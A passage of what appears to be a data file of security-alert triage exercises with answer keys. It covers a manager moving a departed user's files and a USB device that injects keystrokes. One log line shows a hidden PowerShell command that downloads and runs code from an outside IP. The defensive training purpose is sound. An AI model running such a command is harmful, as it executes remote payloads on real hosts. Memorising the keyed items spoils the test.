  c: departing-user-data
  k: [0, 2]
  diff: 3
  trap: scary
  say: 'A manager moved 14,200 files out of a former colleague''s retained OneDrive into the team site over two hours from a compliant laptop.'
  tell: 'Fourteen thousand files touched in two hours sounds like a smash and grab, except the owner already left and the deletion workflow handed the manager the retained account on purpose. The files moved inside the tenant from a compliant office laptop with no sync client or external link. The leaver is not the actor here.'
- id: y193
  d: endpoint
  src: 'EDR · Device control + input telemetry'
  t: 'New USB device typing into the foreground window'
  h: 'LT-ACC22 · corp\p.okafor'
  l: ['device: new USB composite device at 14:02 exposing mass storage (volume label "GIFT") and a keyboard interface; vendor and product ID not in the approved device list', 'input: 212 keystrokes in 1.6 s starting with Win+R, then a command line and Enter, while the user was idle for 11 min with the screen unlocked', 'process: powershell.exe -w hidden -nop -c "iex (iwr http://185.x.x.x/a)", parent explorer.exe, 2 s after the device appeared', 'mailroom note: a parcel with a USB drive and a gift card arrived for this user last week from a sender with no matching order']
  v: 1
  x: T1200
  c: hid-injection-vs-token
  k: [0, 1]
  diff: 3
  say: 'A new USB device that also presented as a keyboard typed 212 keystrokes in under two seconds, opening a dialog and a hidden PowerShell.'
  tell: 'A drive that also declares itself a keyboard, 212 keystrokes in under two seconds, Win+R and a hidden PowerShell while the user is away. This is the shape of the FIN7 mailed-USB campaign and every rubber-ducky demo. Blocking USB mass storage would not have stopped it, because the device is a keyboard.'
  q: {kind: contain, ask: 'First action?', o: ['Isolate the laptop, pull the device for forensics and sweep for the same vendor ID and the 185 address', 'Eject the drive and ask the user to scan it', 'Block USB mass storage tenant-wide and close the alert'], a: 0, why: 'The payload already ran; contain the host, keep the hardware and hunt for siblings.'}
- id: y194
  d: endpoint
  src: 'EDR · Device control + input telemetry'
